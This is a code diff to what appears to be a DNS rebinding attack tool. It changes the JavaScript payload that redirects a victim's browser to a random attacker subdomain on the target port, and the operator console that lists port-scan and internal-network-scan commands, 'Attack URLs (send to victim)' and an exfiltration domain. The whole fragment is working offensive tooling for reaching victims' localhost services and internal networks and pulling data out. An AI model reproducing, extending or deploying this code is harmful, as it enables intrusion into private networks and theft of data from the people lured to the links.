@@ -137,8 +137,11 @@ class PayloadGenerator:
     if (needsRedirect) {{
         const uniqueHost = 'r' + Math.random().toString(36).slice(2, 10) + '.' + baseDomain;
         // Redirect to TARGET PORT so fetch is same-origin
-        const newUrl = 'http://' + uniqueHost + ':' + CONFIG.targetPort + window.location.pathname + window.location.search;
-        console.log('Redirecting to: ' + newUrl);
+        const pathname = window.location.pathname || '/';
+        const search = window.location.search || '';
+        const newUrl = 'http://' + uniqueHost + ':' + CONFIG.targetPort + pathname + search;
+        console.log('DEBUG: pathname=' + pathname + ', search=' + search);
+        console.log('DEBUG: Redirecting to: ' + newUrl);
         window.location.href = newUrl;
         throw new Error('Redirecting...');
     }}
@@ -1325,10 +1328,11 @@ class CommandProtocol(LineReceiver):
         self.send(f'    /portscan  - Scan ports on victim localhost')
         self.send(f'    /netscan   - Scan internal network')
         self.send('')
+        static_host = config.static_hosts[0] if config.static_hosts else f"static.{config.domain}"
         self.send('  Attack URLs (send to victim):')
-        self.send(f'    http://attack.{config.domain}:{http_port}/single')
-        self.send(f'    http://attack.{config.domain}:{http_port}/single?path=/admin')
-        self.send(f'    http://attack.{config.domain}:{http_port}/portscan')
+        self.send(f'    http://{static_host}:{http_port}/single')
+        self.send(f'    http://{static_host}:{http_port}/single?path=/admin')
+        self.send(f'    http://{static_host}:{http_port}/portscan')
         self.send('')
         self.send('  How it works:')
         self.send('    1. Victim visits URL → loads from YOUR server')
@@ -1450,7 +1454,8 @@ def print_banner():
     print(f'  Exfil domain:    *.{config.exfil_prefix}.{config.domain}')
     print()
     if config.enable_http:
-        print(f'  \033[93m📋 Attack URL:\033[0m    http://attack.{config.domain}:{config.http_port}/single')
+        static_host = config.static_hosts[0] if config.static_hosts else f"static.{config.domain}"
+        print(f'  \033[93m📋 Attack URL:\033[0m    http://{static_host}:{config.http_port}/single')
     else:
         print(f'  \033[93m📋 Attack URL:\033[0m    (HTTP payloads disabled - use --http-enable)')
     print()
